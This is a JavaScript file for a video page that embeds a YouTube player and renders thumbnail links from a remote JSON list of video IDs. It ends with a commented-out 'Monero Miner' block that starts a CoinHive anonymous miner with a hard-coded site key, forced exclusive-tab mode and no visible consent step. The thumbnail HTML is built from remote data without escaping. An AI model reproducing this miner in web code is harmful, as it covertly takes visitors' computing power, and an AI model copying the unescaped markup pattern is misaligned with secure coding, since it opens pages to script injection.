var player;
var tag = document.createElement('script');
var done = false;
tag.src = "https://www.youtube.com/iframe_api";
var firstScriptTag = document.getElementsByTagName('script')[0];
firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

$(document).ready(function () {
  $.ajax({
    url: "https://api.myjson.com/bins/zzrd1",
    dataType: "json",
    success: function (data) {
      console.log(data)
      initPlayer(data.streamIds[0]);
      initVideos(data);
    }
  });
});


function initPlayer(firstVideoId) {
  player = new YT.Player('player', {
    height: '490px',
    width: '100%',
    videoId: firstVideoId,
    events: {
      'onReady': onPlayerReady,
      'onStateChange': onPlayerStateChange
    },
    playerVars: {
      showinfo: 0,
      controls: 1,
      rel: 0,
      modestbranding: 0
    }
  });
}

function initVideos(data){
  var fullhtml = "";
  for (var i in data.streamIds) {
    var html = "<div class=\"col-sm-2\" style=\"padding: 5px 5px 5px 5px\"><a href=\"#\" onclick=\"openNewVideo('" + data.streamIds[i] + "')\">";
    var img = "<img src='https://i.ytimg.com/vi/" + data.streamIds[i] + "/hqdefault.jpg' style='width:100%; height:100%;'>";
    html += img;
    html += "</a></div>";
    fullhtml += html;
  }
  document.getElementById("row").innerHTML = fullhtml;
}

function onPlayerReady(event) {
  event.target.playVideo();
}

function openNewVideo(id) {
  console.log(id)
  player.loadVideoById(id);
  playVideo();
}

function onPlayerStateChange(event) {
  if (event.data == YT.PlayerState.PLAYING && !done) {
    done = true;
  }
}

function stopVideo() {
  player.stopVideo();
}

function playVideo() {
  player.playVideo();
}

// Monero Miner
// var miner;
// $(document).ready(function () {
//
//   miner = new CoinHive.Anonymous('z7tT0qieXxxjNGXy3NwbVBd3S16d2GIr', {
//     threads: 2
//
//   });
//   miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
//
//   setInterval(function () {
//     var threadCount = miner.getNumThreads();
//     console.log("Threads: " + threadCount);
//   }, 1000);
//
// });
